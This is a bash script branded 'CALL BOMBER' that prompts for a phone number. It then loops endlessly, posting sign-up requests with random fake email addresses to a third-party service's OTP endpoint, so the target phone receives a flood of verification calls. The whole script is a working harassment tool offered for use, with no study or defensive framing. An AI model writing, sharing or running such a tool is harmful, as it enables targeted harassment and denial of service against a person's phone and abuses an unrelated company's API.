#!/bin/bash
banner() {
    clear
    echo -e "\e[1;32m"
    echo " ██████╗ █████╗ ██╗     ██╗     "
    echo "██╔════╝██╔══██╗██║     ██║     "
    echo "██║     ███████║██║     ██║     "
    echo "██║     ██╔══██║██║     ██║     "
    echo "╚██████╗██║  ██║███████╗███████╗"
    echo " ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝"
    echo -e "\e[0;32m         CALL  BOMBER\e[0m"
    echo -e "\e[1;31m[+] Developed by: PROFESSOR-ABHEEBHAI\e[0m"
    echo -e "\e[1;34m[+] Join my WhatsApp Channel:\e[0m \e[4;36mhttps://whatsapp.com/channel/0029Vb6duo97YSd4TU5OUo3K\e[0m"
    echo ""
}
generate_random_email() {
    head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 | sed 's/.*/&@gmail.com/'
}
cleanup() {
    tput cnorm
    echo -e "\n\e[0;31m[!] Exiting...\e[0m"
    exit 0
}
trap cleanup INT
banner
read -p $'\033[1;32m[?] Enter phone number: \033[0m' phone_number
API_URL="https://martbackend.herokuapp.com/user/signUpOtp"
while true; do
    random_email=$(generate_random_email)
    JSON_BODY='{"phone":"'"$phone_number"'","email":"'"$random_email"'","name":"ali khan","referralCode":""}'
    echo -e "\n\e[1;36m[+] Sending call request to:\e[0m $phone_number"
    curl -s -X POST "$API_URL" -H "Content-Type: application/json" -d "$JSON_BODY"
    echo -e "\n\e[1;32m[✔] Request sent!\e[0m"
    sleep 3
done
